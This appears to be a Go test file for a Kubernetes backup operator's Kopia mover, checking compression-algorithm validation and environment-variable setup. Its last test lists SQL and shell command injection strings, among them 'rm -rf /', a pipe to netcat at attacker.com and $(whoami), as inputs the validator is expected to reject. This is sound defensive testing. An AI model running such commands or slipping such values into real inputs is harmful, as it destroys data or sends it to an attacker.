package kopia

import (
	"testing"

	volsyncv1alpha1 "github.com/backube/volsync/api/v1alpha1"
	"github.com/go-logr/logr"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/client-go/kubernetes/scheme"
	"k8s.io/client-go/tools/events"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/client/fake"
)

const kopiaCompressionEnvVar = "KOPIA_COMPRESSION"

// TestCompressionErrorHandling tests error paths for compression feature
func TestCompressionErrorHandling(t *testing.T) {
	tests := getCompressionErrorTestCases()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			client, source, secret := setupCompressionErrorTest(tt.compression)
			err := attemptCompressionBuild(client, source, secret)
			validateCompressionError(t, err, tt)
		})
	}
}

// getCompressionErrorTestCases returns test cases for compression error handling
func getCompressionErrorTestCases() []struct {
	name          string
	compression   string
	expectError   bool
	errorContains string
} {
	return []struct {
		name          string
		compression   string
		expectError   bool
		errorContains string
	}{
		{
			name:          "invalid compression should fail builder",
			compression:   "invalid-algorithm",
			expectError:   true,
			errorContains: "invalid compression algorithm",
		},
		{
			name:          "lz4 not supported",
			compression:   "lz4",
			expectError:   true,
			errorContains: "invalid compression algorithm",
		},
		{
			name:          "bzip2 not supported",
			compression:   "bzip2",
			expectError:   true,
			errorContains: "invalid compression algorithm",
		},
		{
			name:          "random string rejected",
			compression:   "super-fast-compress",
			expectError:   true,
			errorContains: "invalid compression algorithm",
		},
		{
			name:          "case sensitive - ZSTD uppercase invalid",
			compression:   "ZSTD",
			expectError:   true,
			errorContains: "invalid compression algorithm",
		},
		{
			name:          "typo in algorithm name",
			compression:   "ztsd", // typo of zstd
			expectError:   true,
			errorContains: "invalid compression algorithm",
		},
	}
}

// setupCompressionErrorTest creates test fixtures for compression error testing
func setupCompressionErrorTest(compression string) (client.Client, *volsyncv1alpha1.ReplicationSource, *corev1.Secret) {
	s := runtime.NewScheme()
	_ = scheme.AddToScheme(s)
	_ = volsyncv1alpha1.AddToScheme(s)

	source := &volsyncv1alpha1.ReplicationSource{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-source",
			Namespace: "test-ns",
		},
		Spec: volsyncv1alpha1.ReplicationSourceSpec{
			SourcePVC: "test-pvc",
			Kopia: &volsyncv1alpha1.ReplicationSourceKopiaSpec{
				Repository:  "test-secret",
				Compression: compression,
			},
		},
	}

	secret := &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-secret",
			Namespace: "test-ns",
		},
		Data: map[string][]byte{
			"KOPIA_PASSWORD": []byte("test-password"),
		},
	}

	client := fake.NewClientBuilder().
		WithScheme(s).
		WithObjects(source, secret).
		Build()

	return client, source, secret
}

// attemptCompressionBuild tries to build a mover with the given compression settings
func attemptCompressionBuild(client client.Client, source *volsyncv1alpha1.ReplicationSource, _ *corev1.Secret) error {
	logger := logr.Discard()
	eventRecorder := events.NewFakeRecorder(10)

	builder, _ := newBuilder(nil, nil)
	_, err := builder.FromSource(
		client,
		logger,
		eventRecorder,
		source,
		false, // privileged
	)

	return err
}

// validateCompressionError checks if the error matches expectations
func validateCompressionError(t *testing.T, err error, testCase struct {
	name          string
	compression   string
	expectError   bool
	errorContains string
}) {
	if testCase.expectError {
		if err == nil {
			t.Errorf("Expected error for compression %q but got nil", testCase.compression)
		} else if testCase.errorContains != "" {
			if !contains(err.Error(), testCase.errorContains) {
				t.Errorf("Expected error to contain %q but got %q", testCase.errorContains, err.Error())
			}
		}
	} else {
		if err != nil {
			t.Errorf("Expected no error for compression %q but got %v", testCase.compression, err)
		}
	}
}

// TestCompressionBuilderIntegration tests the full builder flow with compression
func TestCompressionBuilderIntegration(t *testing.T) {
	tests := getCompressionBuilderTestCases()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			client, source, secret := setupCompressionBuilderTest(tt.compression)
			mover := buildCompressionMover(t, client, source, secret)
			envVars := mover.buildEnvironmentVariables(secret)
			validateCompressionEnvVar(t, envVars, tt)
		})
	}
}

// getCompressionBuilderTestCases returns test cases for compression builder integration
func getCompressionBuilderTestCases() []struct {
	name             string
	compression      string
	expectEnvVar     bool
	expectedEnvValue string
} {
	return []struct {
		name             string
		compression      string
		expectEnvVar     bool
		expectedEnvValue string
	}{
		{
			name:             "valid compression sets environment",
			compression:      "zstd",
			expectEnvVar:     true,
			expectedEnvValue: "zstd",
		},
		{
			name:         "empty compression doesn't set environment",
			compression:  "",
			expectEnvVar: false,
		},
		{
			name:             "complex compression algorithm",
			compression:      "zstd-better-compression",
			expectEnvVar:     true,
			expectedEnvValue: "zstd-better-compression",
		},
	}
}

// setupCompressionBuilderTest creates test fixtures for compression builder testing
func setupCompressionBuilderTest(compression string) (
	client.Client, *volsyncv1alpha1.ReplicationSource, *corev1.Secret,
) {
	s := runtime.NewScheme()
	_ = scheme.AddToScheme(s)
	_ = volsyncv1alpha1.AddToScheme(s)

	source := &volsyncv1alpha1.ReplicationSource{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-source",
			Namespace: "test-ns",
		},
		Spec: volsyncv1alpha1.ReplicationSourceSpec{
			SourcePVC: "test-pvc",
			Kopia: &volsyncv1alpha1.ReplicationSourceKopiaSpec{
				Repository:  "test-secret",
				Compression: compression,
			},
		},
	}

	secret := &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-secret",
			Namespace: "test-ns",
		},
		Data: map[string][]byte{
			"KOPIA_PASSWORD": []byte("test-password"),
		},
	}

	testClient := fake.NewClientBuilder().
		WithScheme(s).
		WithObjects(source, secret).
		Build()

	return testClient, source, secret
}

// buildCompressionMover builds a Kopia mover for compression testing
func buildCompressionMover(
	t *testing.T, client client.Client, source *volsyncv1alpha1.ReplicationSource, _ *corev1.Secret,
) *Mover {
	logger := logr.Discard()
	eventRecorder := events.NewFakeRecorder(10)

	builder, _ := newBuilder(nil, nil)
	mover, err := builder.FromSource(
		client,
		logger,
		eventRecorder,
		source,
		false, // privileged
	)

	if err != nil {
		t.Fatalf("Failed to build mover: %v", err)
	}

	kopiaM, ok := mover.(*Mover)
	if !ok {
		t.Fatal("Mover is not a Kopia mover")
	}

	return kopiaM
}

// validateCompressionEnvVar checks if the compression environment variable is set correctly
func validateCompressionEnvVar(t *testing.T, envVars []corev1.EnvVar, testCase struct {
	name             string
	compression      string
	expectEnvVar     bool
	expectedEnvValue string
}) {
	var found bool
	var actualValue string
	for _, env := range envVars {
		if env.Name == kopiaCompressionEnvVar {
			found = true
			actualValue = env.Value
			break
		}
	}

	if testCase.expectEnvVar {
		if !found {
			t.Errorf("Expected KOPIA_COMPRESSION env var but not found")
		} else if actualValue != testCase.expectedEnvValue {
			t.Errorf("Expected KOPIA_COMPRESSION=%q but got %q", testCase.expectedEnvValue, actualValue)
		}
	} else {
		if found {
			t.Errorf("Did not expect KOPIA_COMPRESSION env var but found it with value %q", actualValue)
		}
	}
}

// Helper function
func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && (s[:len(substr)] == substr || contains(s[1:], substr)))
}

// TestCompressionValidationDirectCall tests the validateCompression function directly
func TestCompressionValidationDirectCall(t *testing.T) {
	tests := []struct {
		compression string
		shouldPass  bool
	}{
		// Edge cases
		{"", true},               // Empty is valid
		{" zstd", false},         // Leading space
		{"zstd ", false},         // Trailing space
		{"zstd\n", false},        // Newline character
		{"zstd\t", false},        // Tab character
		{"zstd-", false},         // Incomplete algorithm
		{"--zstd", false},        // Double dash prefix
		{"zstd--fastest", false}, // Double dash in middle

		// SQL injection attempts (should all fail)
		{"zstd'; DROP TABLE users; --", false},
		{"zstd OR 1=1", false},

		// Command injection attempts (should all fail)
		{"zstd; rm -rf /", false},
		{"zstd && echo hacked", false},
		{"zstd | nc attacker.com", false},
		{"zstd`whoami`", false},
		{"$(whoami)", false},
	}

	for _, tt := range tests {
		t.Run(tt.compression, func(t *testing.T) {
			err := validateCompression(tt.compression)
			if tt.shouldPass {
				if err != nil {
					t.Errorf("Expected compression %q to pass but got error: %v", tt.compression, err)
				}
			} else {
				if err == nil {
					t.Errorf("Expected compression %q to fail but it passed", tt.compression)
				}
			}
		})
	}
}
